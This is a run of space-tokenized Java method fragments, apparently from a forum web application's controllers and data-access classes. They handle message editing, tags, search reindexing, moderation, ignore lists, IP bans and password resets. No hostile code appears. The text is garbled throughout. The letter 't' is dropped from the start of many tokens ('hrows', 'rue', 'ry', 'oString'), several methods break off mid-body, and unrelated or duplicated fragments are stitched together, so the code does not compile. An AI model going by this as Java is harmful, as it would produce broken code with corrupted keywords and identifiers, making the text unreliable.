private ModelAndView prepareModel ( PreparedMessage preparedMessage , EditMessageRequest form ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = preparedMessage . getGroup ( ) ; params . put ( " group " , group ) ; params . put ( " groups " , groupDao . getGroups ( preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = messageDao . getEditInfo ( message . getId ( ) ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , agDao . getTopTags ( ) ) ; } if ( message . isHaveLink ( ) ) { form . setLinktext ( message . getLinktext ( ) ) ; form . setUrl ( message . getUrl ( ) ) ; } form . setTitle ( message . getTitle ( ) ) ; form . setMsg ( message . getMessage ( ) ) ; return new ModelAndView ( " edit " , params ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditMessageRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return EditMessageRequest . class . equals ( clazz ) ; } 
public ImmutableList < String > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return getMessageTags ( con , msgid ) ; } 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { jdbcTemplate . execute ( new ConnectionCallback < String > ( ) { @Override 
public String doInConnection ( Connection con ) hrows SQLException , DataAccessException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; for ( String ag : newTags ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String ag : oldTags ) { if ( ! newTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; stDec . setInt ( 1 , id ) ; stDec . executeUpdate ( ) ; } } return null ; } 
public boolean updateTags ( final int msgid , final List < String > agList ) { return jdbcTemplate . execute ( new ConnectionCallback < Boolean > ( ) { @Override 
public Boolean doInConnection ( Connection con ) hrows SQLException , DataAccessException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = rue ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = rue ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
private static boolean isGoodTag ( String ag ) { return agRE . matcher ( ag ) . matches ( ) ; } 
public boolean isIgnored ( Set < Integer > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . contains ( userid ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) hrows Exception { Message message = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( message . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! message . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( message . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } return new ModelAndView ( " setpostscore " , " message " , messageDao . getById ( msgid ) ) ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , rue ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( mpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { Connection db = null ; Section section = sectionDao . getSection ( sectionid ) ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " ag " , required = false ) String ag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; Section section = null ; if ( sectionid ! = null ) { urlParams . append ( " section= " ) . append ( Integer . oString ( sectionid ) ) ; section = sectionDao . getSection ( sectionid ) ; params . put ( " section " , section ) ; params . put ( " archiveLink " , section . getArchiveLink ( ) ) ; } if ( ag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " ag= " ) . append ( URLEncoder . encode ( ag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " ) . append ( Integer . oString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; ry { if ( month = = null ) { 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId ) hrows Exception { ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionDao . getSection ( sectionId ) ; modelAndView . getModel ( ) . put ( " section " , section ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) hrows Exception { Section section = sectionDao . getSection ( sectionid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public List < Message > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return newsViewer . getMessagesCached ( con ) ; } 
public List < Message > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return newsViewer . getMessages ( con ) ; } 
public DeletedTopic mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new DeletedTopic ( rs ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + '/' + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Group group = groupDao . getGroup ( groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , false ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { checkTag ( ag ) ; List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , ag ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , false ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut , boolean useAbsoluteUrl ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , useAbsoluteUrl ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags ) { return prepareMessage ( message , ags , rue , false ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags , boolean includeCut , boolean useAbsoluteUrl ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , false , useAbsoluteUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < Message > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return feedBurner ? nv . getMessages ( con ) : nv . getMessagesCached ( con ) ; } 
public List < PreparedMessage > getPreparedMessages ( Connection db ) hrows SQLException { List < Message > messages = getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = new PreparedMessage ( db , message , false , mainUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < Message > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return nv . getMessages ( con ) ; } 
public static EditInfoDTO createFromMessage ( TagDao agDao , Message message ) { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( agDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) hrows Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . build ( message ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public List < EditInfoDTO > loadEditInfo ( int msgid ) { List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public void resolveMessage ( int msgid , boolean b ) { jdbcTemplate . update ( " UPDATE topics SET resolved=?,lastmod=lastmod+'1 second'::interval WHERE id=? " , 
public void addToMemories ( int userid , int opic ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? FOR UPDATE " , Integer . class , userid , opic ) ; if ( res . isEmpty ( ) ) { jdbcTemplate . update ( 
public MemoriesListItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new MemoriesListItem ( rs ) ; } 
public void delete ( int id ) { jdbcTemplate . update ( " DELETE FROM memories WHERE id=? " , id ) ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { hrow new UserErrorException ( " invalid postscore " + postscore ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Message msg = messageDao . getById ( msgid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; return new ModelAndView ( " ignore-list " , " ignoreList " , ignoreMap ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) hrows UserNotFoundException { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUser ( id ) ; ignoreListDao . remove ( user , delUser ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; return new ModelAndView ( " ignore-list " , " ignoreList " , ignoreMap ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( mpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public void remove ( User listOwner , User userToIgnore ) { jdbcTemplate . update ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " , 
public Set < Integer > get ( User user ) { final ImmutableSet . Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
public ModelAndView serverInfo ( ) hrows Exception { List < User > moderators = userDao . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userDao . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public void uncommit ( Message msg ) { jdbcTemplate . update ( " UPDATE topics SET moderate='f',commitby=NULL,commitdate=NULL WHERE id=? " , msg . getId ( ) ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionDao . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) hrows Exception { Section section = sectionDao . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public void setSectionDa ( SectionDao sectionDao ) hrows SectionNotFoundException { sectionNews = sectionDao . getSection ( Section . SECTION_NEWS ) ; } 
public List < ArchiveDao . ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( sectionNews , 13 ) ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; dto . setSection ( section ) ; dto . setGroup ( group ) ; return dto ; } 
public Group getGroup ( int id ) hrows BadGroupException { ry { return jdbcTemplate . queryForObject ( 
public Group mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new Group ( rs ) ; } 
public int calcTopicsCount ( Group group , boolean showDeleted ) { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setString ( 1 , itle ) ; if ( info . length ( ) > 0 ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( longInfo . length ( ) > 0 ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
private void updateCache ( Connection db ) { ry { getUser ( db , id , false ) ; 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , encryptedPassword , user . getId ( ) ) ; return password ; } 
public void updateResetDate ( User user , Timestamp now ) { jdbcTemplate . update ( " UPDATE users SET lostpwd=? WHERE id=? " , now , user . getId ( ) ) ; } 
public boolean canResetPassword ( User user ) { return ! jdbcTemplate . queryForObject ( " SELECT lostpwd>CURRENT_TIMESTAMP-'1 week'::interval as datecheck FROM users WHERE id=? " , 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , s ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp s ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( blockInfo = = null ) { jdbcTemplate . update ( 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public String mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return ParserUtil . bb2xhtml ( ext , rue , rue , " " , userDao ) ; 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return deleteReplys ( msgid , user , score , 0 ) ; } 
public CommentsListItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { CommentsListItem item = new CommentsListItem ( ) ; item . setSectionTitle ( rs . getString ( " ptitle " ) ) ; item . setGroupTitle ( rs . getString ( " gtitle " ) ) ; item . setTopicId ( rs . getInt ( " opicid " ) ) ; item . setCommentId ( rs . getInt ( " msgid " ) ) ; item . setTitle ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) ; item . setPostdate ( rs . getTimestamp ( " postdate " ) ) ; return item ; } 
public DeletedListItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new DeletedListItem ( rs ) ; } 
public Object doInConnection ( Connection con ) hrows SQLException { mpl . performLogin ( response , con , user ) ; return null ; } 
